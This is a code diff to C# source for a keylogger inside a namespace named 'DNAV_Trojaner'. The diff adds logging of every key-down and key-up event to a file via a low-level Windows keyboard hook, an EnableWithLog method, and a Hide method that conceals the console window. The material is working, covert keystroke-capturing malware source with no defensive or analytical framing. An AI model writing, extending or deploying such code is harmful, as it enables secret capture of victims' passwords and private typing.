@@ -21,6 +21,8 @@ namespace DNAV_Trojaner
         private const int WM_KEYUP = 0x0101;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
+        private static bool _logFile = false;
+        private static string _path;
 
         public static string Keys
         {
@@ -39,10 +41,16 @@ namespace DNAV_Trojaner
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                StreamWriter sw = new StreamWriter(Keylogger._path, true);
+                sw.WriteLine("DOWN: " + (Keys)vkCode);
+                sw.Close();
                 Keylogger._keys += "DOWN: " + (Keys)vkCode + "\n";
             } else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+                StreamWriter sw = new StreamWriter(Keylogger._path, true);
+                sw.WriteLine("UP: " + (Keys)vkCode);
+                sw.Close();
                 Keylogger._keys += "UP: " + (Keys)vkCode + "\n";
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -83,19 +91,25 @@ namespace DNAV_Trojaner
 
         public static void Enable()
         {
-            var handle = GetConsoleWindow();
-
-            // Hide
-            //ShowWindow(handle, SW_HIDE);
-
             _hookID = SetHook(_proc);
             Application.Run();
             UnhookWindowsHookEx(_hookID);
         }
 
-        public void Disable()
+        public static void EnableWithLog(string path)
         {
-
+            Keylogger._logFile = true;
+            Keylogger._path = path;
+            _hookID = SetHook(_proc);
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
         }
+
+        public static void Hide()
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+        }
+
     }
 }
